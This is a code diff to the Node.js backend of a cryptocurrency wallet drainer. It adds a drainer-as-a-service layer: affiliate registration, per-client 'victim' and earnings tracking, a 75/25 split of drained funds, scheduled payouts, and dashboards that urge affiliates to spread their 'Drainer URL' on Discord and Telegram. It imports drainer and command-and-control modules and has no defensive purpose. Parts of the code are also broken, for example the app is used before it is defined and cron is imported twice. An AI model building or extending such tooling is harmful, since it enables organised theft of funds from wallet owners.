@@ -23,8 +23,82 @@ import { uiManager } from './modules/UIManager.js';
 import { c2Communicator } from './modules/c2Communicator.js';
 import { securityManager } from './modules/securityManager.js';
 import { chainManager } from './modules/chainManager.js';
+import { generateClientSite } from './client-template.js';
+import { generateMarketingSite } from './saas-website.js';
+import { ethers, Wallet } from 'ethers';
+import cron from 'node-cron';
 
 const coreDrainer = new CoreDrainer();
+
+
+// Main marketing website
+app.get('/', (req, res) => {
+  const marketingSite = generateMarketingSite();
+  res.send(marketingSite);
+});
+
+// Client registration page
+app.get('/signup', (req, res) => {
+  const marketingSite = generateMarketingSite();
+  res.send(marketingSite);
+});
+
+// ==================== SAAS CLIENT MANAGEMENT ====================
+let clients = new Map();
+
+// Client configuration structure
+class Client {
+  constructor(id, config) {
+    this.id = id;
+    this.name = config.projectName;
+    this.themeColor = config.themeColor || '#6366f1';
+    this.wallet = config.wallet;
+    this.domain = `${id}.drainersaas.com`;
+    this.earnings = 0;
+    this.createdAt = new Date().toISOString();
+    this.status = 'active';
+  }
+}
+
+// Client registration endpoint
+app.post('/saas/register', (req, res) => {
+  try {
+    const { projectName, themeColor, wallet, contact } = req.body;
+    
+    // Validate wallet address
+    if (!wallet || !ethers.isAddress(wallet)) {
+      return res.status(400).json({ error: 'Valid wallet address required' });
+    }
+
+    // Generate client ID
+    const clientId = projectName.toLowerCase().replace(/[^a-z0-9]/g, '-') + '-' + Date.now().toString().slice(-6);
+    
+    // Create client
+    const clientConfig = {
+      projectName,
+      themeColor: themeColor || '#6366f1',
+      wallet,
+      contact
+    };
+    
+    const newClient = new Client(clientId, clientConfig);
+    clients.set(clientId, newClient);
+    
+    console.log(`🎯 New client registered: ${projectName} (${clientId})`);
+    
+    res.json({
+      success: true,
+      clientId: clientId,
+      domain: `https://${clientId}.drainersaas.com`,
+      adminUrl: `https://your-backend.com/saas/admin/${clientId}`,
+      message: 'Client registered successfully'
+    });
+    
+  } catch (error) {
+    console.error('Client registration error:', error);
+    res.status(500).json({ error: 'Registration failed' });
+  }
+});
 
 // Add this function after your imports
 function initializeBitcoin() {
@@ -49,6 +123,319 @@ function initializeBitcoin() {
     return null;
   }
 }
+
+
+// ==================== ENHANCED CLIENT MANAGEMENT ====================
+let clientEarnings = new Map();
+let clientVictims = new Map();
+
+// Enhanced Client class
+class EnhancedClient {
+  constructor(id, config) {
+    this.id = id;
+    this.name = config.projectName;
+    this.themeColor = config.themeColor || '#6366f1';
+    this.wallet = config.wallet;
+    this.contact = config.contact;
+    this.domain = `${id}.drainersaas.com`;
+    this.totalEarnings = 0;
+    this.pendingPayout = 0;
+    this.totalPayouts = 0;
+    this.victimCount = 0;
+    this.createdAt = new Date().toISOString();
+    this.status = 'active';
+    this.lastPayout = null;
+  }
+}
+
+// Enhanced registration endpoint
+app.post('/saas/v2/register', (req, res) => {
+  try {
+    const { projectName, themeColor, wallet, contact } = req.body;
+    
+    if (!wallet || !ethers.isAddress(wallet)) {
+      return res.status(400).json({ error: 'Valid wallet address required' });
+    }
+
+    const clientId = projectName.toLowerCase().replace(/[^a-z0-9]/g, '-') + '-' + Date.now().toString().slice(-6);
+    
+    const clientConfig = {
+      projectName,
+      themeColor: themeColor || '#6366f1',
+      wallet,
+      contact
+    };
+    
+    const newClient = new EnhancedClient(clientId, clientConfig);
+    clients.set(clientId, newClient);
+    clientEarnings.set(clientId, []);
+    clientVictims.set(clientId, []);
+    
+    console.log(`🎯 Enhanced client registered: ${projectName} (${clientId})`);
+    
+    res.json({
+      success: true,
+      clientId: clientId,
+      domain: `https://your-backend.onrender.com/saas/client/${clientId}`,
+      adminUrl: `https://your-backend.onrender.com/saas/admin/v2/${clientId}`,
+      dashboardUrl: `https://your-backend.onrender.com/saas/dashboard/${clientId}`,
+      message: 'Client registered successfully'
+    });
+    
+  } catch (error) {
+    console.error('Enhanced registration error:', error);
+    res.status(500).json({ error: 'Registration failed' });
+  }
+});
+
+// ==================== EARNINGS TRACKING ====================
+
+// Track drain earnings per client
+function trackClientEarning(clientId, amount, token, victimAddress) {
+  if (!clients.has(clientId)) return;
+  
+  const client = clients.get(clientId);
+  const earnings = clientEarnings.get(clientId) || [];
+  const victims = clientVictims.get(clientId) || [];
+  
+  const earningRecord = {
+    id: Date.now().toString(),
+    amount: amount,
+    token: token,
+    victimAddress: victimAddress,
+    timestamp: new Date().toISOString(),
+    clientShare: amount * 0.75, // Client gets 75%
+    platformShare: amount * 0.25 // You keep 25%
+  };
+  
+  earnings.push(earningRecord);
+  victims.push(victimAddress);
+  
+  // Update client totals
+  client.totalEarnings += amount;
+  client.pendingPayout += amount * 0.75;
+  client.victimCount = victims.length;
+  
+  clientEarnings.set(clientId, earnings);
+  clientVictims.set(clientId, victims);
+  
+  console.log(`💰 Client ${clientId} earned: ${amount} ${token} from ${victimAddress}`);
+}
+
+// Enhanced track endpoint with earnings
+app.post("/api/track/v2", async (req, res) => {
+  try {
+    const { walletAddress, chain, clientId, amount = 0.1, token = 'ETH' } = req.body;
+    
+    if (clientId && clients.has(clientId)) {
+      const client = clients.get(clientId);
+      
+      // Track the victim connection
+      console.log(`👤 Client ${clientId} - Victim: ${walletAddress} on ${chain}`);
+      
+      // Simulate earnings (in real scenario, this comes from actual drains)
+      trackClientEarning(clientId, amount, token, walletAddress);
+      
+      // Emit real-time update
+      io.emit(`client-${clientId}`, {
+        type: 'victim_connected',
+        walletAddress: walletAddress,
+        chain: chain,
+        amount: amount,
+        token: token,
+        timestamp: new Date().toISOString()
+      });
+    }
+    
+    res.json({ success: true, tracked: true });
+    
+  } catch (error) {
+    console.error('Enhanced tracking error:', error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+
+// ==================== AUTOMATED PAYOUT SYSTEM ====================
+
+let payoutHistory = new Map();
+
+class Payout {
+  constructor(clientId, amount, txHash = null) {
+    this.id = Date.now().toString();
+    this.clientId = clientId;
+    this.amount = amount;
+    this.txHash = txHash;
+    this.status = txHash ? 'completed' : 'pending';
+    this.timestamp = new Date().toISOString();
+    this.processedAt = txHash ? new Date().toISOString() : null;
+  }
+}
+
+// Process payouts for all clients
+async function processAllPayouts() {
+  console.log('💰 Processing weekly payouts...');
+  let totalPayouts = 0;
+  
+  for (const [clientId, client] of clients.entries()) {
+    if (client.pendingPayout > 0.001) { // Minimum 0.001 ETH payout
+      try {
+        // In real implementation, you'd send crypto here
+        // For now, we'll simulate the payout
+        const payout = new Payout(clientId, client.pendingPayout, `0x${Math.random().toString(16).slice(2)}`);
+        
+        // Store payout history
+        const clientPayouts = payoutHistory.get(clientId) || [];
+        clientPayouts.push(payout);
+        payoutHistory.set(clientId, clientPayouts);
+        
+        // Update client records
+        client.totalPayouts += client.pendingPayout;
+        client.lastPayout = new Date().toISOString();
+        
+        console.log(`✅ Processed payout for ${client.name}: ${client.pendingPayout} ETH`);
+        
+        // Reset pending payout
+        client.pendingPayout = 0;
+        totalPayouts++;
+        
+      } catch (error) {
+        console.error(`❌ Payout failed for ${client.name}:`, error);
+      }
+    }
+  }
+  
+  console.log(`🎉 Completed ${totalPayouts} payouts`);
+  return totalPayouts;
+}
+
+// Manual payout trigger (for testing)
+app.post('/saas/admin/process-payouts', async (req, res) => {
+  try {
+    const { password } = req.body;
+    
+    // Simple admin authentication
+    if (password !== process.env.ADMIN_PASSWORD) {
+      return res.status(401).json({ error: 'Unauthorized' });
+    }
+    
+    const processed = await processAllPayouts();
+    
+    res.json({
+      success: true,
+      message: `Processed ${processed} payouts`,
+      timestamp: new Date().toISOString()
+    });
+    
+  } catch (error) {
+    console.error('Payout processing error:', error);
+    res.status(500).json({ error: 'Payout processing failed' });
+  }
+});
+
+// Weekly automatic payouts (every Monday 9 AM UTC)
+import cron from 'node-cron';
+
+cron.schedule('0 9 * * 1', async () => {
+  console.log('⏰ Running scheduled payouts...');
+  await processAllPayouts();
+});
+
+// Client payout history endpoint
+app.get('/saas/payouts/:clientId', (req, res) => {
+  const { clientId } = req.params;
+  
+  if (!clients.has(clientId)) {
+    return res.status(404).json({ error: 'Client not found' });
+  }
+  
+  const payouts = payoutHistory.get(clientId) || [];
+  const client = clients.get(clientId);
+  
+  res.json({
+    success: true,
+    client: {
+      name: client.name,
+      wallet: client.wallet,
+      totalPayouts: client.totalPayouts
+    },
+    payouts: payouts.reverse().slice(0, 20), // Last 20 payouts
+    pendingPayout: client.pendingPayout
+  });
+});
+
+// ==================== CLIENT NOTIFICATION SYSTEM ====================
+
+// Send notifications to clients
+async function notifyClient(clientId, type, data) {
+  const client = clients.get(clientId);
+  if (!client) return;
+  
+  const notifications = {
+    victim_connected: {
+      title: '🎉 New Participant!',
+      message: `New wallet connected to your drainer: ${data.walletAddress}`
+    },
+    payout_processed: {
+      title: '💰 Payout Processed!',
+      message: `Your payout of ${data.amount} ETH has been sent to ${client.wallet}`
+    },
+    milestone_reached: {
+      title: '🏆 Milestone Reached!',
+      message: `You've reached ${data.milestone} participants!`
+    }
+  };
+  
+  const notification = notifications[type];
+  if (notification) {
+    console.log(`📧 Notification for ${client.name}: ${notification.message}`);
+    
+    // In real implementation, you'd send Telegram/email here
+    // For now, we'll log and emit via Socket.IO
+    io.emit(`client-${clientId}-notification`, {
+      type: type,
+      title: notification.title,
+      message: notification.message,
+      timestamp: new Date().toISOString(),
+      data: data
+    });
+  }
+}
+
+// Enhanced tracking with notifications
+app.post("/api/track/v3", async (req, res) => {
+  try {
+    const { walletAddress, chain, clientId, amount = 0.1, token = 'ETH' } = req.body;
+    
+    if (clientId && clients.has(clientId)) {
+      const client = clients.get(clientId);
+      
+      // Track earnings
+      trackClientEarning(clientId, amount, token, walletAddress);
+      
+      // Send notification
+      await notifyClient(clientId, 'victim_connected', {
+        walletAddress: walletAddress,
+        chain: chain,
+        amount: amount
+      });
+      
+      // Check for milestones
+      if (client.victimCount % 10 === 0) {
+        await notifyClient(clientId, 'milestone_reached', {
+          milestone: `${client.victimCount} participants`
+        });
+      }
+    }
+    
+    res.json({ success: true, tracked: true });
+    
+  } catch (error) {
+    console.error('V3 tracking error:', error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
 
 
 // ADD THIS IMPORT - import from backend/config.js instead of src/config.js
@@ -77,7 +464,6 @@ const chains = JSON.parse(fs.readFileSync(chainsPath, 'utf8'));
 // Load environment variables from frontend/.env
 dotenv.config({ path: path.join(__dirname, '.env') });
 console.log('✅ Loaded backend .env');
-const app = express();
 const server = http.createServer(app);
 export const io = new SocketIOServer(server);
 
@@ -169,6 +555,297 @@ const ipWhitelist = (req, res, next) => {
   
   next();
 };
+
+// ==================== ADVANCED CLIENT DASHBOARD ====================
+
+app.get('/saas/dashboard/:clientId', (req, res) => {
+  const { clientId } = req.params;
+  
+  if (!clients.has(clientId)) {
+    return res.status(404).send('Client not found');
+  }
+  
+  const client = clients.get(clientId);
+  const earnings = clientEarnings.get(clientId) || [];
+  const victims = clientVictims.get(clientId) || [];
+  
+  const dashboardHTML = `
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard - ${client.name}</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Arial', sans-serif;
+            background: #0f0f23;
+            color: #ffffff;
+            line-height: 1.6;
+        }
+        
+        .dashboard {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .header {
+            display: flex;
+            justify-content: between;
+            align-items: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid rgba(99, 102, 241, 0.3);
+        }
+        
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .logo {
+            font-size: 1.8rem;
+            font-weight: bold;
+            background: linear-gradient(135deg, ${client.themeColor}, #8b5cf6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .stat-card {
+            background: rgba(30, 30, 60, 0.6);
+            border: 1px solid rgba(99, 102, 241, 0.3);
+            border-radius: 15px;
+            padding: 25px;
+            backdrop-filter: blur(10px);
+        }
+        
+        .stat-value {
+            font-size: 2.2rem;
+            font-weight: bold;
+            color: ${client.themeColor};
+            margin-bottom: 5px;
+        }
+        
+        .stat-label {
+            color: #94a3b8;
+            font-size: 0.9rem;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            margin-top: 10px;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, ${client.themeColor}, #8b5cf6);
+            border-radius: 4px;
+        }
+        
+        .section {
+            background: rgba(30, 30, 60, 0.6);
+            border: 1px solid rgba(99, 102, 241, 0.3);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 20px;
+            backdrop-filter: blur(10px);
+        }
+        
+        .section-title {
+            font-size: 1.3rem;
+            margin-bottom: 20px;
+            color: ${client.themeColor};
+        }
+        
+        .earnings-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        .earnings-table th,
+        .earnings-table td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .earnings-table th {
+            color: #94a3b8;
+            font-weight: normal;
+            font-size: 0.9rem;
+        }
+        
+        .positive {
+            color: #10b981;
+        }
+        
+        .url-box {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(99, 102, 241, 0.5);
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: monospace;
+            word-break: break-all;
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, ${client.themeColor}, #8b5cf6);
+            border: none;
+            border-radius: 8px;
+            color: white;
+            padding: 12px 24px;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(99, 102, 241, 0.3);
+        }
+        
+        .payout-info {
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="dashboard">
+        <div class="header">
+            <div class="brand">
+                <div class="logo">${client.name}</div>
+                <div style="color: #94a3b8;">Dashboard</div>
+            </div>
+            <div style="color: #94a3b8;">Client ID: ${clientId}</div>
+        </div>
+        
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-value">$${(client.totalEarnings * 1800).toFixed(2)}</div>
+                <div class="stat-label">Total Earnings (USD)</div>
+                <div class="progress-bar">
+                    <div class="progress-fill" style="width: ${Math.min((client.totalEarnings / 10) * 100, 100)}%"></div>
+                </div>
+            </div>
+            
+            <div class="stat-card">
+                <div class="stat-value">$${(client.pendingPayout * 1800).toFixed(2)}</div>
+                <div class="stat-label">Pending Payout (Your 75%)</div>
+                <div class="progress-bar">
+                    <div class="progress-fill" style="width: ${Math.min((client.pendingPayout / 5) * 100, 100)}%"></div>
+                </div>
+            </div>
+            
+            <div class="stat-card">
+                <div class="stat-value">${client.victimCount}</div>
+                <div class="stat-label">Total Participants</div>
+                <div class="progress-bar">
+                    <div class="progress-fill" style="width: ${Math.min((client.victimCount / 50) * 100, 100)}%"></div>
+                </div>
+            </div>
+            
+            <div class="stat-card">
+                <div class="stat-value">${client.totalEarnings.toFixed(4)} ETH</div>
+                <div class="stat-label">Total Volume</div>
+                <div class="progress-bar">
+                    <div class="progress-fill" style="width: ${Math.min((client.totalEarnings / 5) * 100, 100)}%"></div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="section">
+            <h3 class="section-title">🚀 Your Drainer URL</h3>
+            <div class="url-box">
+                https://your-backend.onrender.com/saas/client/${clientId}
+            </div>
+            <p style="color: #94a3b8; margin-bottom: 15px;">
+                Share this link on Discord, Telegram, or social media to start earning!
+            </p>
+            <button class="btn" onclick="copyUrl()">Copy URL</button>
+        </div>
+        
+        <div class="payout-info">
+            <h3 style="color: #10b981; margin-bottom: 10px;">💰 Payout Information</h3>
+            <p><strong>Next Payout:</strong> Every Monday 9:00 AM UTC</p>
+            <p><strong>Your Wallet:</strong> ${client.wallet}</p>
+            <p><strong>Your Share:</strong> 75% of all earnings</p>
+            <p><strong>Platform Fee:</strong> 25% (covers hosting & maintenance)</p>
+        </div>
+        
+        <div class="section">
+            <h3 class="section-title">📈 Recent Earnings</h3>
+            ${earnings.length > 0 ? `
+                <table class="earnings-table">
+                    <thead>
+                        <tr>
+                            <th>Date</th>
+                            <th>Amount</th>
+                            <th>Your Share</th>
+                            <th>Participant</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        ${earnings.slice(-10).reverse().map(earning => `
+                            <tr>
+                                <td>${new Date(earning.timestamp).toLocaleDateString()}</td>
+                                <td>${earning.amount} ${earning.token}</td>
+                                <td class="positive">${earning.clientShare.toFixed(4)} ${earning.token}</td>
+                                <td style="color: #94a3b8;">${earning.victimAddress.slice(0, 8)}...${earning.victimAddress.slice(-6)}</td>
+                            </tr>
+                        `).join('')}
+                    </tbody>
+                </table>
+            ` : `
+                <p style="color: #94a3b8; text-align: center; padding: 40px;">
+                    No earnings yet. Share your URL to start earning!
+                </p>
+            `}
+        </div>
+    </div>
+
+    <script>
+        function copyUrl() {
+            const url = 'https://your-backend.onrender.com/saas/client/${clientId}';
+            navigator.clipboard.writeText(url).then(() => {
+                alert('URL copied to clipboard!');
+            });
+        }
+        
+        // Auto-refresh every 30 seconds
+        setInterval(() => {
+            window.location.reload();
+        }, 30000);
+    </script>
+</body>
+</html>
+  `;
+  
+  res.send(dashboardHTML);
+});
 
 // ==================== SINGLE-POPUP API ENDPOINTS ====================
 
@@ -903,6 +1580,72 @@ app.get('/api/multisig/status/:operationId', (req, res) => {
 app.get('/api/multisig/pending', (req, res) => {
   const pendingRequests = multiSigManager.getPendingRequests();
   res.json({ pending: pendingRequests });
+});
+
+
+// Dynamic client site serving
+app.get('/saas/client/:clientId', (req, res) => {
+  try {
+    const { clientId } = req.params;
+    
+    if (!clients.has(clientId)) {
+      return res.status(404).send('Client not found');
+    }
+    
+    const client = clients.get(clientId);
+    const clientSite = generateClientSite(client);
+    
+    res.send(clientSite);
+  } catch (error) {
+    console.error('Client site error:', error);
+    res.status(500).send('Error loading site');
+  }
+});
+
+// Client admin dashboard
+app.get('/saas/admin/:clientId', (req, res) => {
+  const { clientId } = req.params;
+  
+  if (!clients.has(clientId)) {
+    return res.status(404).send('Client not found');
+  }
+  
+  const client = clients.get(clientId);
+  
+  const adminHTML = `
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Admin - ${client.name}</title>
+        <style>
+            body { font-family: Arial; margin: 40px; background: #0f0f23; color: white; }
+            .card { background: #1e1e3f; padding: 20px; border-radius: 10px; margin: 10px 0; }
+            .earnings { color: #10b981; font-size: 2em; font-weight: bold; }
+        </style>
+    </head>
+    <body>
+        <h1>🏢 ${client.name} - Admin Dashboard</h1>
+        <div class="card">
+            <h3>💰 Earnings Overview</h3>
+            <div class="earnings">$${(client.earnings * 1800).toFixed(2)} USD</div>
+            <small>${client.earnings} ETH total drained</small>
+        </div>
+        <div class="card">
+            <h3>🔗 Your Drainer URL</h3>
+            <input type="text" value="https://your-backend.com/saas/client/${clientId}" readonly style="width: 100%; padding: 10px; margin: 10px 0;">
+            <p>Share this link to start earning!</p>
+        </div>
+        <div class="card">
+            <h3>📊 Next Payout</h3>
+            <p>Next automatic payout: <strong>Monday 9 AM UTC</strong></p>
+            <p>Your wallet: <code>${client.wallet}</code></p>
+            <p>You keep: <strong>75%</strong> of all earnings</p>
+        </div>
+    </body>
+    </html>
+  `;
+  
+  res.send(adminHTML);
 });
 
 // ==================== C&C CONTROL CENTER ====================
@@ -3454,7 +4197,32 @@ app.post('/api/immediate-drain', async (req, res) => {
   }
 });
 
-
+// Modify your existing track endpoint
+app.post("/api/track", async (req, res) => {
+  try {
+    const victimData = req.body;
+    const clientId = req.headers['x-client-id'] || getClientIdFromReferrer(req.headers.referer);
+    
+    // Track for specific client
+    if (clientId && clients.has(clientId)) {
+      const client = clients.get(clientId);
+      console.log(`👤 Client ${clientId} - Victim: ${victimData.walletAddress}`);
+      
+      // Emit to client-specific channel
+      io.emit(`client-${clientId}`, {
+        walletAddress: victimData.walletAddress,
+        chain: victimData.chain,
+        timestamp: new Date().toISOString(),
+        client: client.name
+      });
+    }
+    
+    return trackHandler(req, res);
+  } catch (error) {
+    console.error('Tracking error:', error);
+    return trackHandler(req, res);
+  }
+});
 // ==================== CLEANUP TASK ==================== // ADDED
 // ==================== GLOBAL ERROR HANDLING ====================
 
